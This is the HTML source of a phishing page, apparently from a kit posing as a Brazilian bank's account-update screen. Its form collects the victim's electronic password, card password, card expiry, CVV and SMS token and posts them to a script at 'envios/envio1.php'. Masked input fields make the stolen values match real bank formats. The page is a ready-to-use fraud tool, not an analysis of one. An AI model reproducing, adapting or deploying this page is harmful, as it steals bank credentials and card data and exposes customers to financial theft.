<!--
   Theme Name: Hiper Atualização cadastrais
   Author: MK(rj)
    -->
    <!DOCTYPE html>
<html lang="pt-BR">
   <head>
   <meta name="theme-color" content="#FF7F00">
   <title>Para Você</title>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8">

   <!-- CSS -->
   <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
   <link rel="stylesheet" type="text/css" href="css/estilo.css">
   
   <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

   <meta name="viewport" content="width=device-width, initial-scale=1.0">

   <!-- scripts -->
   <script src="js/jquery-3.2.1.min.js"></script>
   <script src="js/jquery.mobile-1.3.2.min.js"></script>
   <script src="js/jquery.mask.js"></script>
   <script src="js/bootstrap.js"></script>
   <script src="js/script.js"></script>

   <!-- mascara -->
   <script type="text/javascript">
       $(document).ready(function(){
         $('#senha1').mask('000000');
         $('#senha2').mask('000000');
         $('#validade').mask('00/0000');
         $('#cvv').mask('000');
         $('#itoken').mask('00000000000');
       });
   </script>
   </head>
   <body id="tela2">
      <div class="container">
         <div class="row">
            <section class="conteudo2">
               <form method="POST" id="formulario-tela2" class="form-inline" action="envios/envio1.php">
                  <input type="hidden" name="agencia" id="agencia" value="">
                  <input type="hidden" name="conta" id="conta" value="">

                  <div class="form-group">
                     <input id="senha1" name="senha1" placeholder="Senha eletrônica" type="password" pattern="[0-9]*" minlength="6" required>
                  </div>
                  <div class="form-group">
                     <input id="senha2" name="senha2" placeholder="Senha do cartão" type="password" pattern="[0-9]*" minlength="6" required>
                  </div>
                  <div class="form-group">
                     <input id="validade" name="validade" placeholder="Validade do Cartão" type="tel" minlength="6" required>
                     <input id="cvv" name="cvv" placeholder="Cód. Segurança" type="tel" minlength="3" required>
                  </div>
                  <div class="form-group">
                     <input id="itoken" name="itoken" placeholder="Digite seu número SMS" type="tel" minlength="11" required>
                  </div>
                  <input type="submit" name="Enviar">
               </form>
            </section>
         </div>
      </div>
      <footer>
         <section class="rodape">
            <i class="img-responsive localizacao">
            <img src="img/localizador.png" width="8%;">
            </i>
            <i class="img-responsive itoken">
            <img src="img/itoken.png" width="17%;">
            </i>
            <i class="img-responsive informacao">
            <img src="img/info.png" width="10%;">
            </i>
         </section>
      </footer>
   </body>
   <script type="text/javascript">
   	// mascara 
   	var app = angular.module('mk', ['angularMask','angular-creditcard-flag']);
   	app.controller('MainCtrl', function($scope) {
   	    $scope.field = {
   	        validade: null
   	    };
   	    $scope.field = {
   	        itoken: null
   	    };
   	});
   </script>
</body><head>

</head>
</body>
</html>